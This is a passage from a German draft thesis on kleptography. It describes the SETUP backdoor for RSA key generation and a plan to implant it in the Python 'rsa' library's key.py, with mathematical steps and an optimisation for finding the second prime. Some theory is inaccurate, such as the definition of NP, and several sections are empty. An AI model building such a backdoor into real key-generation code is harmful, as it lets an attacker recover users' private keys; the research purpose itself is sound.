        Alternativ zum Baby-Step-Giant-Algorithmus kann der diskrete Logarithmus auch mit dem Pohlig-Hellman-Algorithmus berechnet werden. Dieser weißt die Zeitkomplexität von $\mathcal{O}(n \log{n} + n\sqrt{p})$ und die Speicherkomplexität von $\mathcal{O}(\sqrt{p})$ auf. \footcite[4]{mit:diclog}

    \subsection{Effiziente Berechnung der diskreten Exponentialfunktion}
    \label{sec-Effiziente Berechnung der diskreten Exponentialfunktion}
        In der Kryptographie werden große Zahlen genutzt, um die Sicherheit der verwendeten Algorithmen zu gewährleisten. Hierfür wird als Beispiel angenommen, dass als Basis $z$ eine 256-bit Lange Zahl hoch einem 300-bit langem Exponenten $x$ genommen werden soll. Hierbei ist $n$ 1024-bit lang. 

        Wenn man nun $z$ in Byte berechnet wäre dies eine 32 Byte lange Zahl.

        $x$ entspricht einer ungefähr 90. stelligen Zahl. 

        \begin{equation}
            z^{10^{90}} \pmod n \equiv y
            \eqlabel{eq-dis-exp-lN}{Diskretere Exponentialfunktion mit großen Zahlen}
        \end{equation}

        Eine numerische Berechnung von $ z^{10^{90}} $ ist aufgrund von begrenzten Ressourcen nicht möglich. 

        Jedoch kann man sich die diskrete Eigenschaft dieser Problems sich zu nutzte machen. Hierfür können Verfahren, wie Square-and-Multiply zusammen mit der Restklassenberechnung genutzt werden. Dadurch lassen sich auch großzahlige Exponenten berechnen. Hierfür soll ein einfaches Beispiel gegeben werden:
        \begin{equation}
            37^{52} \pmod {128} \equiv y
            \eqlabel{eq-dis-exp-bspOne}{Diskretere Exponentialfunktion mit großen Zahlen Beispiel-Eins}
        \end{equation}
        Bei Betrachtung der Äquivalenzgleichung fällt auf, dass $37^{52}$ eine große Zahl ergibt. Jedoch wird diese Zahl noch $ x \pmod 128$ gerechnet. Dadurch liegt das Ergebnis in einem Zahlenraum von:
        \begin{equation}
            y \in \mathbb{N} \mid 0 \le y < 128 
            \eqlabel{eq-dis-exp-numSpace}{Diskretere Exponentialfunktion in Zahlenraum}
        \end{equation}

        Auf Grundlage der Potenzgesetze wird $37^{52}$ nun zerlegt. 
        \begin{equation}
        \begin{aligned}
            52 = 32 + 16 + 4 = 2^{5} + 2^{4} + 2^{2} \\
            37^{52} \pmod {128} \equiv 37^{(2^{5})} * 37^{(2^{4})} * 37^{(2^{2})} \\
            \equiv 37^{(2^{5})} \pmod {128} * 37^{(2^{4})} \pmod {128} * 37^{(2^{2})} \pmod {128}
        \end{aligned}
        \eqlabel{eq-dis-exp-bspTwo}{Diskretere Exponentialfunktion mit großen Zahlen Beispiel-Zwei}
        \end{equation}

        Die einzelnen Bestandteile werden dann iterativ berechnet und durch Multiplikation zusammengefasst (siehe \ref{eq-dis-exp-bspTwo}). Dies wird als Square-and-Multiply-Verfahren bezeichnet.
        \begin{equation}
        \begin{aligned}
            37^{2^{2}} \pmod {128} \equiv (37^{(2^{1})} \pmod {128})^{2} \\
            37^{2^{3}} \pmod {128} \equiv (37^{(2^{2})} \pmod {128})^{2} \\
            37^{2^{4}} \pmod {128} \equiv (37^{(2^{3})} \pmod {128})^{2} \\
            37^{2^{5}} \pmod {128} \equiv (37^{(2^{4})} \pmod {128})^{2}
        \end{aligned}
        \eqlabel{eq-dis-exp-bspThree}{Diskretere Exponentialfunktion mit großen Zahlen Beispiel-Drei}
        \end{equation}
        
        \subsubsection{Allgemein}
            Gegeben mit gesucht $y$:
            \begin{equation}
                z^{x} \pmod n \equiv y
            \end{equation}

            Zerlegung von $x$ eine Summe von Zweierpotenzen:
            \begin{equation}
                x = 2^{0} + 2^{1} + 2^{2} + ...
            \end{equation}

            Dabei bilden die binären Logarithmen der einzelnen Zweierpotenzen die Menge $\mathbb{K}$.

            Berechnung der einzelnen Faktoren durch iteratives Square-and-Multiply-Verfahren. Dies wird bis $f(max(\mathbb{K}))$ berechnet. $max(\mathbb{K})$ steht hier für das Element von $\mathbb{K}$, mit dem größten Wert.
            \begin{equation}
                f(i+1) = f(i)^{2} \pmod n \mid f(1) = z^{1} \pmod n 
            \end{equation}

            Zuletzt wird das Produkt, aller Ergebnisse von $f(x)$ für die Elemente der Menge $\mathbb{K}$, gebildet. Dabei gilt:

            \begin{equation}
                \prod_{k \in \mathbb{K}} f(k) \equiv z^{x} \pmod n \equiv y
            \end{equation}

    

\section{Komplexitätstheorie}
    Die Komplexitätstheorie befasst sich mit der Komplexität von Problemen, welche durch Algorithmen gelöst werden. Dabei wird der Speicherbedarf und der Zeitaufwand eines Algorithmus betrachtet. Schrankenfunktionen werden gebildet durch die Betrachtung des Speicherbedarf und des Zeitaufwands im Bezug auf die Länge der Eingabeparameter. Da hier eine reine kryptographische Betrachtung der Schrankenfunktionen stattfinden soll, wird hier nur in zwei verallgemeinerte Schrankenfunktionen \footcite[178]{BSW.2015} unterschieden:
    \begin{itemize}
        \item Polynomiale Komplexität
        \item Nicht-deterministisch-polynomiale Komplexität
    \end{itemize}
    Polynomiale Komplexität umfasst hier alle Probleme, die algorithmisch mit polynomialem Aufwand (Zeit/Speicher) gelöst werden können. D.h. bei steigender Eingabelänge $n$ steigt der Aufwand im schlimmsten Fall mit $\mathcal{O}(n^{c}$, wobei $c$ konstant ist.
    Diese Probleme gehören damit zur Komplexitätsklasse \textbf{P}. Diese umfasst alle Probleme, welche algorithmisch mit maximal polynomialem Aufwand gelöst werden können. Diese Probleme können meistens von modernen Computern gelöst werden.

    Nicht-deterministisch-polynomiale Komplexität hingegen umfasst alle Probleme, die deterministisch mehr als polynomialen Aufwand im Worst-Case brauchen. Dies können Probleme sein, die algorithmisch nur mit exponentiellen $\Omega(d^{n} \mid d > 1)$ oder faktoriellen $\mathcal{O}(n!)$ Aufwand \footcite{wiki.komplex} gelöst werden können. 
    Diese Probleme werden der Komplexitätsklasse $\mathcal{NP}$ zugewiesen. Dies sind Probleme können nicht von deterministischen Computern in Polynomialzeit gelöst werden. 
    
    \paragraph{Bezug zur Kryptographie} Dadurch sind mathematische Probleme in $\mathcal{NP}$ für die Kryptographie besonders interessant, da man die Sicherheit eines Systems auf ein NP-vollständiges Problem stützen kann. Somit ist die theoretische Sicherheit des Systems nicht mit vertretbaren Aufwand  brechbar. Jedoch sollte darauf geachtet werden, dass die vorgesehenen Teilnehmer an einem Datenaustausch nicht auch das NP-vollständige Problem lösen müssen. Ihr Aufwand soll so gering wie möglich gehalten werden, wobei der Aufwand für einen Angreifer exponentiell oder faktoriell zur Sicherheit des Systems (z.B. die Länge des Schlüssels) ist. 

    Beispiele für solche Probleme sind der diskrete Logarithmus \ref{sec-Diskreter Lograithmus} und die Faktorisierung \ref{sec-Faktorisierung} eines Produkt von Primzahlen\footcite[179]{BSW.2015}. Weitere Beispiele wäre die Berechnung des Subgraph-Isomorphismus zweier Graphen, das Berechnen von Modularen Quadratwurzeln oder die Multiplikation auf elliptischen Kurven.
    % QUELLEN


\chapter{RSA}
\ac{RSA} ist ein kryptographisches Verfahren, welches zu den Public-Key-Verfahren gehört. Der Verfahren wurde von R. Rivest, A. Shamir und L. Adleman entwickelt und trägt deshalb ein Anagram der Erfinder als Namen.

\section{Auflauf}
    \paragraph{Ausgangszenario} Teilnehmer A will über ein öffentliches Netz sicher mit anderen Teilnehmer kommunizieren. 

    \paragraph{Schlüsselgeneration} Damit andere Teilnehmer geheime Nachrichten schicken können muss A sich ein Schlüsselpaar generieren. Dafür wählt er zwei zufällige und große Primzahlen: $p$ und $q$. 

    Das Produkt von $p$ und $q$ bildet $n$, welche den Modulo / den Zahlenraum für weitere mathematische Operationen festlegt: 
        \begin{equation}
            n = p * q
        \end{equation}

    Daraufhin berechnet der Teilnehmer die Eulersche $\phi$-Funktion von $p$ und $q$:
        \begin{equation}
            \phi(n) = (p-1) * (q-1)
        \end{equation})
    
    Der öffentliche Schlüssel $e$ ist dann eine zu $\phi(n)$ teilerfremde Zahl. Man kann dies auch vereinfachen und eine Fermat’sche Primzahl für $e$ verwenden:
        \begin{equation}
            2^{2^{n}}+1 \mid n=0,1,2,3,4
        \end{equation}

\section{Sicherheit}
Die Sicherheit des RSA-Verfahrens basiert auf zwei mathematischen Problemen, welche unter Aufwand endlicher Ressourcen, nicht gelöst werden können. Hierbei wird sich sowohl auf RSA-gestützte Verschlüsselungs- und Signaturverfahren bezogen.
Diese zwei Probleme sind:
\begin{itemize}
    \item Faktorisierung einer bekannten Zahl, welche das Produkt zweier großer Primzahlen ist. Im Kontext von RSA ist diese Zahl mit $n$ repraesentiert.
    \item Bestimmung des diskreten Logarithmus. Bei RSA wäre dies die Bestimmung von 
    \begin{equation}
        d \mid m^{d} \equiv c \pmod n .
    \end{equation}
\end{itemize}

Für die Sicherheit der Public-Key-Verschlüsselung von RSA, spielt Unberechenbarkeit der Faktorisierung die Hauptrolle. Falls mit RSA signiert werden soll, ist zusätzlich die Unberechenbarkeit des diskreten Logarithmus wichtig. Ansonsten könnte der private und geheime Schlüssel abgeleitet werden.




\chapter{Kleptographie}
    \section{Definition}
    % Was ist Kleptographie


    \section{Geschichte}
    % Ursprünglicher Angriff / Konzept

    \section{Angriffskategorie}
        Bisher wurden Angriffe auf kryptographisches Systeme in eine der vier Kategorien \ref{sec-Kryptoanalyse} unterteilt (Known Cipher, Known Plaintext, Chosen Cipher, Chosen Plaintext). Ein kleptographischer Angriff fällt jedoch in keiner dieser Kategorien. Für kleptographische Angriffe müsste eine weitere, fünfte Kategorie geschaffen werden: Known Key Attacks. 
        % Angriffe sind vielleicht Side-Channel Attacks
        % Angriff auf die Implementation

    \section{Aufbau kleptographischer Angriffe}
    

        \subsection{Vorrausetzungen}


        \subsection{SETUP}
        % Beschreibung des SETUPS

    \section{SETUP für RSA}
        \subsection{Voraussetzungen}
            Für ein \ac{SETUP}-Angriff auf eine Implementation von \ac{RSA} hat der Angreifer ein eigenes Schlüsselpaar: $N_{A}$ Modulus des Angreifers, $E_{A}$ Öffentlicher Schlüssel des Angreifers, $D_{A}$ Privater Schlüssel des Angreifers. Das Schlüsselpaar wird wie für \ac{RSA} üblich generiert.
        
        \subsection{Generierung und Verschlüsselung}
            \paragraph{Schritt 1} \label{sec-Schritt-Gen 1} Es wird eine zufällige Primzahl $P$ generiert. $P$ wird dann mit dem öffentlichen Schlüssel des Angreifers verschlüsselt:
            \begin{equation}
                vP = P^{E_{A}} \mod N_{A}
                \eqlabel{eq-SETUP-vP}{Verschlüsselung von P mit dem öffentlichen Schlüssel des Angreifers}
            \end{equation}

            \paragraph{Schritt 2} \label{sec-Schritt-Gen 2} $N'$ wird gebildet indem $vP$ und eine Zufallszahl gleicher Länge $t$ in binärer Form konkateniert werden:
            \begin{equation}
                N' = vP || t
                \eqlabel{eq-SETUP-N'}{Berechnung des temporären Modulus}
            \end{equation}
            $N'$ ist dabei nicht der Modulus des generierten \ac{RSA}-Schlüsselpaars sondern nur eine temporäre Form.

            \paragraph{Schritt 3} \label{sec-Schritt-Gen 3} Berechnung der zweiten Primzahl $Q$: 
            \begin{equation}
                P \cdot Q + R = N'
                \eqlabel{eq-SETUP-Q}{Berechnung der zweiten Primzahl P}
            \end{equation}
            
            \paragraph{Schritt 4} \label{sec-Schritt-Gen 4} Bestimmung des Modulus $N$, wie für \ac{RSA} üblich durch:
            \begin{equation}
                N = P \cdot Q
                \eqlabel{eq-SETUP-N}{Berechnung von N}
            \end{equation}

            \paragraph{Schritt 5} \label{sec-Schritt-Gen 5} Wählen des öffentlichen Schlüssels $E$ und Berechnen des privaten Schlüssels $D$ mittels der modularen multiplikativen Inversen bzgl. $\phi(N)$:
            \begin{equation}
                D = modular\_multiplicative\_inverse(E, \phi(N))
                \eqlabel{eq-SETUP-D}{Berechnung von D}
            \end{equation}

            \paragraph{Schritt 6} \label{sec-Schritt-Gen 6} Mit Schritt 5 wurde ein vollkommen funktionales \ac{RSA}-Schlüsselpaar erstellt. Mittels diesem können nun Informationen verschlüsselt/signiert, Chiffren entschlüsselt und Signaturen verifiziert werden, wie in \ref{sec-RSA-crypt} und \ref{sec-RSA-sign} gezeigt wurde.
        
        \subsection{Angriff}
            \paragraph{Schritt 1} \label{sec-Schritt-Ang 1} Der Angreifer erlangt den öffentlichen Schlüssel des Ziels und besitzt somit $N$ und $E$. Dies ist möglich, da diese Informationen öffentlich sind.

            \paragraph{Schritt 2} \label{sec-Schritt-Ang 2} Der Angreifer teilt $N$ in binärer Form in der Hälfte womit er $vP$ erhält. Die mathematische Begründung hierfür in \ref{sec-SETUP-vP_from_N}.

            \paragraph{Schritt 3} \label{sec-Schritt-Ang 3} $P$ wird durch die Entschlüsslung von $vP$ mittels des privaten Schlüssels des Angreifers berechnet: 
            \begin{equation}
                P = (vP)^{D_{A}} \mod N_{A}
                \eqlabel{eq-SETUP-P}{Berechnung des ersten Primfaktors bei kleinem R}
            \end{equation}
            Damit ist dieser Schritt die inverse Operation zu \ref{sec-Schritt-Gen 1}.
            Zusätzlich muss auch $vP + 1$ entschlüsselt werden.
            Die mathematische Begründung hierfür in \ref{sec-SETUP-Hin-Prim}.
            % Bei der Überprüfung, Prüfen ob P und Q prim
            \begin{equation}
                P' = (vP+1)^{D_{A}} \mod N_{A}
                \eqlabel{eq-SETUP-Palt}{Berechnung des ersten Primfaktors bei großem R}
            \end{equation}
            
            \paragraph{Schritt 4} \label{sec-Schritt-Ang 4} Hiermit ist der Angreifer im Besitz des ersten Primfaktors $P$ oder $P'$. Somit ist die Primfaktorzerlegung von $N$ trivial:
            \begin{equation}
                Q = N / P
                \eqlabel{eq-SETUP-Q}{Primfaktorzerlegung für P}
            \end{equation}
            Die Primfaktorzerlegung muss, gleich wie bei \ref{sec-Schritt-Ang 3}, für den alternativen Primfaktor $P'$ berechnet werden:
            \begin{equation}
                Q' = N / P'
                \eqlabel{eq-SETUP-Q}{Primfaktorzerlegung für P'}
            \end{equation}

            \paragraph{Schritt 5} \label{sec-Schritt-Ang 5} Der Angreifer ist hiermit im Besitz der Primfaktoren $P$, $Q$ und kann den privaten Schlüssel $D$ bestimmen \eqref{eq-SETUP-D}. Gleiches muss für die alternativen Primfaktoren berechnet werden.

            \paragraph{Schritt 6} \label{sec-Schritt-Ang 6} Der Angreifer besitzt den privaten und öffentlichen Schlüssel. Somit können Chiffren entschlüsselt und Signaturen gefälscht werden. Dabei muss der Angreifer, wenn noch nicht geschehen, den privaten Schlüssel $D$ und den alternativen privaten Schlüssel $D'$ einmalig testen, um den richtigen zu bestimmen.

        \subsection{Hintergründe zum RSA-SETUP}
            \subsubsection{Informationsgewinnung von vP aus N} \label{sec-SETUP-vP_from_N}
                

            \subsubsection{Bedigungen für den alternativen Primfaktor} \label{sec-SETUP-Hin-Prim}
                

            \subsection{Verfahren zur Bestimmung des korrekten Primfaktors}
                Die Schritte 3 bis 6 des Angriffs befassen sich mit dem Finden des korrekten Primfaktor aus den zwei resultierenden Möglichkeiten von vP $vP$ und $vP+1$. Daraus werden die Werte und ihre Alternativen für $P$, $N$, $Q$ und $D$ berechnet. 
                Um schlussendlich zu entscheiden, ob die Werte die aus $vP$ oder $vP+1$, kann eine Signatur mit $D$ und $D'$ mit einer Signatur des Angriffsziels verglichen werden. Dadurch kann eine eindeutige Entscheidung getroffen werden. 

                Diese Entscheidung kann jedoch unter Umständen früher berechnet werden. Dieser Fall kann bei folgenden Berechnungsschritten  auftreten:

                

                \subsubsection{Berechnung von P}
                    $P$ wird berechnet indem $vP$ mittels dem privaten Schlüssel $D_{A}$ des Angreifers entschlüsselt wird. Dabei sollte, wie für eine \ac{RSA}-Ver-/Entschlüsselung üblich, eine vollkommen zufällige Zahl resultieren. Jedoch ist es eine Bedingung, dass $P$ prim ist. 
                    Die Wahrscheinlichkeit, dass eine Zufallszahl, mit steigender Anzahl an Stellen, prim ist sehr gering. 
                    Mathematische Erläuterung %ref

                    Falls das entschlüsselte $P$ nicht prim ist, muss es die Alternative $P'$ sein. Gleiches gilt wiederum auch für $P'$.

                \subsubsection{Berechnung von Q} 
                    Bei der Berechnung von $Q$ gilt die gleiche Eigenschaft, wie bei $P$, dass $Q$ prim seien muss.

                    Jedoch kann unter Umständen schon bei der Berechnung von $Q$, durch die Division mit Dividend $N$ und Divisor $P$, die Entscheidung getroffen werden. Dabei wird geprüft, ob $Q$ ganzzahlig ist. 
                    Die Wahrscheinlichkeit für diesen Fall wird hier erläutert: %ref.
                    Die Entscheidung kann hierbei mit einer Laufzeit von $O(1)$ getroffen werden. Dies ist deutlich schneller als die Laufzeit einer Überprüfung auf prim. 
                    Diese Überprüfung wird hier erläutert %ref.

                \subsubsection{Fehler bei der modularen multiplikativen Inverse}
                    Bei der Berechnung von $D$ wird die modulare multiplikative Inverse von $E$ und $\phi(N)$ bestimmt. Dabei kann es zu einem Fehler kommen, da für den Tupel von $E$ und $\phi(N)$ möglicherweise keine modulare multiplikative Inverse existiert.

                    % Mathematische Wahrscheinlichkeit
                
                




        



      



\chapter{Angriffskonzept}

    \section{Ziel}
        Folgender Abschnitt der Arbeit, befasst sich mit der Auswahl des Ziels für einen kleptographischen Angriff. Hierbei soll es sich um eine Softwarebibliothek handeln. Zudem soll diese Open-Source und hinreichend verbreitet sein. Die zugrundeliegende Programmiersprache soll abstrakt genug sein, dass die kryptographischen Operationen in Software abgebildet werden. Programmiersprachen, welche Hardware, wie \ac{TPM} nutzten, sind nicht für einen Angriff auf Softwarebibliotheken weniger geeignet.

        Als Programmiersprache wurde für die Implementation Python gewählt, weil Python weit verbreitet ist, eine Vielzahl an Open Source Libraries und die Syntax nah an Pseudocode liegt. Somit kann die Implementation leichter verstanden und schneller in andere Sprachen übersetzt werden. Zudem besitzt Python einfach integrierte Funktionen für die Berechnung diskreter Exponentialfunktionen. Python ist zudem in der Lage vor der Kompilierung / Interpretierung und während der Laufzeit Funktionen zu Überschreiben. Python kann zudem objektorientiert verwendet werden, was bei der Abstraktion des Codes hilft und somit die Verständlichkeit fördert. Da der \ac{RSA}-Algorithmus mit großen ganzen Zahlen arbeiten muss bietet Python ein Vorteil im Gegensatz zu Alternativen wie Java, indem der zu Verfügung stehende Datentype int unbounded als von seiner Speicherlänge nicht begrenzt ist. In Java würde ein int maximal 32-bit Länge haben, was nicht ausreichend für jeglichen \ac{RSA}-Algorithmus ist. Zudem ist eine Deklaration von Datentypen in Python nicht nötig. 

        Als Angriffsziel wurde das PIP-Packet "rsa" gewählt. Dabei handelt es sich um eine Open Source Software Packet von Sybren A. Stüvel, welches den \ac{RSA}-Algorithmus und Hilfsfunktionalitäten komplett in Python implementiert. Dieses Packet wurde aufgrund der Beleibtheit ausgewählt. Es wird unter dem Namen "python-rsa" auf Git-hub gepflegt. Die Bearbeitung des Packet wurde mit dem Entwickler Sybren A. Stüvel abgesprochen.

        Nach Betrachtung des Aufbaus des Angriffsziels wurde sich dafür entschieden die Datei key.py manipulieren. Diese Python-Datei verwaltet die Generierung der Schlüssel(-parameter).
    
    \section{Angriffsvektoren}
        Die hier aufgeführten Angriffsvektoren beschreiben, wie ein kryptographisches System kompromittiert werden kann.

        \subsection{Kryptotrojaner}

        \subsection{Dependency Confusion}
\chapter{Implementation}
    Es folgt die konkrete Implementation einer kleptographsichen Schwachstelle in die ausgewählte Softwarebibliothek.

    \section{Optimierung}
        \subsection{Berechnung von Q}
            Es wird aufgezeigt, wie die Berechnung des manipulierten Primfaktors $Q$ optimiert werden kann. Dabei soll möglichst vermieden werden, dass ein komplette Neugenerierung ab \ref{sec-Schritt-Gen 1} stattfinden muss. Dafür werden \ref{sec-Schritt-Gen 2} und \ref{sec-Schritt-Gen 3} verändert. Dafür wird sich zu nutze gemacht, dass die beiden Zufallszahlen $t$ und $R$ die gleiche Bitlänge haben und sich auf die gleichen Stellen von $N'$ auswirken / Bezug nehmen. Dadurch ist es möglich das Interval in dem $Q$ liegt in Bezug auf die Parameter $t$ und $R$ zu maximieren. 
            Danach kann das Suchintervall für den Primfaktor $Q$ stark eingeschränkt werden. Dieser Bereich kann dann in wenig Zeitaufwand nach Primzahlen durchsucht werden. Jede Primzahl im Interval ist dabei eine gültige Lösung für $Q$. Zudem wird betrachtet, wie das Interval vergrößert werden kann. Dies erhöht zwar den Suchbereich, aber steigt auch die Chance, dass in dem Interval eine Primzahl liegt.

            Um die Berechnung von $Q$ zu optimieren werden die Zufallszahlen $t$ und $R$ betrachtet. 
            \begin{equation}
                N' = vP || t = P \cdot Q + R
                \eqlabel{imp-opt-calc-q}{Optimierungsansatz Berechnung von Q}
            \end{equation}
            Da $R$ und $t$ die gleiche Länge haben $\overline{R} = \overline{t} = (n/2)$, beeinflussen beide die rechte Hälfe (least significant bits) von $N'$. Die Gleichung muss so gelöst werden, dass mit gegebenen $P$ und somit auch $vP$ eine Primzahl $Q$ gefunden wird, welches die Gleichung löst. Die Gleichung wird nun nach $P * Q $ umgeformt:
            \begin{equation}
                P \cdot Q = (vP || t) - R
                \eqlabel{imp-opt-calc-q-re}{Optimierungsansatz Berechnung von Q nach P}
            \end{equation}
            
            Es sind zwei Grenzfälle zu betrachten, wobei $max$ der größten möglichen Zahl für $(n/2)$ Bits entspricht. $min$ entspricht dabei Wert $0$:
            \begin{equation}
                P \cdot Q = 
                \begin{cases}
                     (vP || \{1\}^{(n/2)}),& \text{if } t = max \wedge R = min\\
                     ((vP-1) || \{0\}^{(n/2 - 1)} || 1),& \text{if } t = min \wedge R = max\\
                     [((vP-1) || *), ((vP) || *)],              & \text{otherwise}
                \end{cases}
                \eqlabel{imp-opt-calc-q-cases}{Grenzfälle für die Zufallszahlen t und R}
            \end{equation}
            Demnach liegt $P \cdot Q$ im Interval von $[((vP-1) || *), ((vP) || *)]$ liegt. Das Bedeutet die Suche der Primzahl $Q$ kann auf folgend beschränkt werden.
            \begin{equation}
                \begin{aligned}
                    minQ = \lceil((vP-1) || \{0\}^{(n/2)}) / P \rceil \\
                    maxQ = \lfloor(vP    || \{1\}^{(n/2)}) / P \rfloor
                \end{aligned}
                \eqlabel{imp-opt-bounds-q}{Minima und Maxima für Q}
            \end{equation}
            Die vereinfachte Darstellung ergibt sich aus der Eigenschaft aller Primzahlen ausgenommen $2$, dass sie ungerade un somit ein Produkt, von zwei solcher Primzahlen nicht gerade seien kann.
            \begin{equation}
                \begin{aligned}
                    P = 2k + 1 \\
                    Q = 2l + 1 \\
                    P \cdot Q = (2k + 1)\cdot(2l+1) \\
                                = 4kl + 2k + 2l + 1 \\
                                = 2(2kl + k + l) + 1 = 2x + 1
                \end{aligned}
                \eqlabel{imp-opt-simpl}{Produkt zweier ungerader Zahlen}
            \end{equation}

            Die in \ref{imp-opt-bounds-q} berechneten Interval von dem Minima und Maxima von $Q$ ist maximal groß unter Einbeziehung der Variablen $t$ und $R$. Dadurch wird die Wahrscheinlichkeit, dass eine Primzahl $Q$ für gegebenes $P$ und $vP$ gibt, welches die Gleichung \ref{imp-opt-calc-q} löst maximal. Dadurch wird die Wahrscheinlichkeit eines Neubeginns durch wählen eines anderen $P$ reduziert. Zudem entfällt durch die Optimierung die Wahl der Zufallszahl $t$, welches zu einer nicht signifikaten Laufzeit Reduzierung führt. 

            Bei einer Implementation von \ac{RSA} wird empfohlen \footcite[1]{dimgt:rsa} wird empfohlen, die Länge der Primfaktoren zu differenzieren, jedoch mit der Bedingung, dass das Produkt der Primfaktoren die Länge $\overline{N} = n$ hat. Die verhindert unter anderem Angriffe, wie die Fermat Faktorisierung \footcite[2]{fermat:article}, welche die Primfaktoren effizient bestimmen kann, wenn diese sehr nah beieinander liegen. Im Rahmen der Implementation konnte beobachtet werden, dass durch die Limitierung von $\overline{P} auf (n/2)-x$, das Interval von $Q$ stark erhöht werden kann. Dies resultiert darin, dass die Wahrscheinlichkeit für eine Primzahl im Intervall sehr hoch wird. In einzelnen Experimenten wurde beobachtet, dass sich die durchschnittliche Größe für das Intervall von $Q$ sich bei einem $x=4$ um den Faktor $2^{4}$ vergrößerte. Dies resultierte in den beobachten Fällen immer in einer erfolgreichen Suche der Primzahl Q im Interval. Der mathematische Zusammenhang hierfür, wobei $min$ dem ersten Fall und $max$ dem zweiten Fall von \ref{imp-opt-calc-q-cases} entspricht.
            \begin{equation}
                \begin{aligned}
                    I_{Q} = [\frac{min}{P}, \frac{max}{P}] \\
                    \Delta I_{Q} = \frac{max}{P} - \frac{min}{P} \\
                    = \frac{max - min}{P}
                \end{aligned}
                \eqlabel{imp-opt-delta-intv-Q}{}
            \end{equation}
            Je kleiner $P$ ist, also je höher $x$, desto größer wird $\Delta I_{Q}$. Für jede Erhöhung von $x$ um $1$ halbiert sich der maximale Wert von $P$. Somit wird der Divisor um den Faktor $2$ halbiert, wodurch das Interval für ein gegebenes $min$ und $max$, sich um Faktor $2$ erhöht. Es kann also pro Erhöhung von $x$, dass Interval um $\Delta I_{Q}$ um den Faktor $2^{x}$ erhöht werden. Somit wird das Interval, indem ein Primzahl liegen muss verdoppel werden und somit auch die Wahrscheinlichkeit, auch wenn nicht genau um den Faktor $2$. Dieser wird nur angenähert, da die Wahrscheinlichkeit einer das $p(x \in \mathbb{Z} : x \in \mathbb{P})$ für höhere $x$ sinkt. 
            Zudem wird durch die Reduktion von $\overline{P}$ um $x$, $\overline{Q}$ um $x$ erhöht, damit $\overline{N} = n \mid N = P \cdot Q$.

            Da die Limitierung eines der Primfaktoren für RSA üblich ist, ist dies eine ausreichende Lösung für das Problem:
            \begin{equation}
                \not \exists Q \in [minQ, maxQ] : Q \in \mathbb{P}
                \eqlabel{imp-opt-prob-no-Q}{Keine Primzahl Q im Interval}
            \end{equation}
            

        \subsection{Verfahren zur Bestimmung der korrekten Primfaktoren}

            Die Schritte 3 bis 6 der Extraktion der geheimen Parameter befassen sich mit dem Finden des korrekten Primfaktor aus den zwei resultierenden Möglichkeiten von vP $vP$ und $vP+1$. Daraus werden die Werte und ihre Alternativen für $P$, $N$, $Q$ und $D$ berechnet. 
            Um schlussendlich zu entscheiden, ob die Werte die aus $vP$ oder $vP+1$, kann eine Signatur mit $D$ und $D'$ mit einer Signatur des Angriffsziels verglichen werden. Dadurch kann eine eindeutige Entscheidung getroffen werden. 

            Diese Entscheidung kann jedoch unter Umständen früher berechnet werden. Dieser Fall kann bei folgenden Berechnungsschritten  auftreten:

            \subsubsection{Berechnung von P}
                $P$ wird berechnet indem $vP$ mittels dem privaten Schlüssel $D_{A}$ des Angreifers entschlüsselt wird. Dabei sollte, wie für eine \ac{RSA}-Ver-/Entschlüsselung üblich, eine vollkommen zufällige Zahl resultieren. Jedoch ist es eine Bedingung, dass $P$ prim ist. 
                Die Wahrscheinlichkeit, dass eine Zufallszahl, mit steigender Anzahl an Stellen, prim ist sehr gering. 
                Mathematische Erläuterung %ref

                Falls das entschlüsselte $P$ nicht prim ist, muss es die Alternative $P'$ sein. Gleiches gilt wiederum auch für $P'$.

            \subsubsection{Berechnung von Q} \label{sec-kep-optQ}
                Bei der Berechnung von $Q$ gilt die gleiche Eigenschaft, wie bei $P$, dass $Q$ prim seien muss.

                Jedoch kann bei der Berechnung von $Q$ eine eindeutige Entscheidung getroffen werden. Der Grund dafür ist, dass $Q$ eine ganze Zahl seien muss, also $Q \in \mathbb(Z)$. 
                Ohne weitere geltende Bedingungen wäre die Überprüfung von $Q = N/P$ und $Q' = N/P'$ auf 
                \begin{equation}
                    \text{Correct prime factors} =
                    \begin{cases}
                        (P, Q) & Q \in Z \wedge Q' \notin \mathbb(Z) \\
                        (P', Q') & Q' \in Z \wedge Q \notin \mathbb(Z) \\
                        (P, Q) & sonst
                    \end{cases}
                    \eqlabel{eq-OPT-Q}{Optimierung für die Bestimmung von Q}
                \end{equation}
                Ohne geltende Bedingungen von \ac{RSA} könnte $Q, Q' \in \mathbb(Z)$ gelten. Da $N$ ein vielfaches beider Zahlen $P$ und $P'$ seien kann. Jedoch ist $N$ in \ac{RSA} das Produkt von zwei Primzahlen. Dadurch gibt es zwei Zahlen $x$ für die gilt $ (N/x) \in \mathbb(Z) $. Dabei handelt es sich um die korrekten Primfaktoren $P$ und $Q$. Dadurch gilt immer nur einer der beiden Fälle in \ref{eq-OPT-Q}. 
                Im Fall 1 ist $ (N/P) \in \mathbb{Z}$, während $N$ kein vielfaches von $P'$ ist.
                Umgekehrtes gilt für Fall 2.
                Der dritte Fall wird dennoch benötigt. Er tritt ein, wenn $Q' = P$ oder $Q = P'$ gilt. 
                Dieser Fall tritt dann ein, wenn $(P^{E} + 1)^{D} \mod N = Q$ gilt. Unter der Annahme, dass die Entschlüsselung einer Hash-Funktion gleich, tritt dieser Fall mit einer Wahrscheinlichkeit von $p(1/N)$ auf. 
                Dieser sehr unwahrscheinliche Fall wird durch Fall 3 von \ref{eq-OPT-Q} abgedeckt. In diesem Fall wird eine der beiden Möglichkeiten ausgewählt, da durch die Kommutativität der Multiplikation es egal ist, ob $[P, Q] \vee [Q, P]$ die richtigen Primfaktoren von $N$ sind.

                Durch \ref{eq-OPT-Q} kann sehr einfach und effizient die richtigen Primfaktoren ausgewählt werden. Diese Überprüfung hat keinen Einfluss auf die Laufzeit des Algorithmus.

                Somit ist diese Überprüfung nicht nur eindeutiger als eine Überprüfung von $P$ auf prim, sondern auch effizienter.

            \subsubsection{Fehler bei der modularen multiplikativen Inverse}
                Bei der Berechnung von $D$ wird die modulare multiplikative Inverse von $E$ und $\phi(N)$ bestimmt. Dabei kann es zu einem Fehler kommen, da für den Tupel von $E$ und $\phi(N)$ möglicherweise keine modulare multiplikative Inverse existiert.

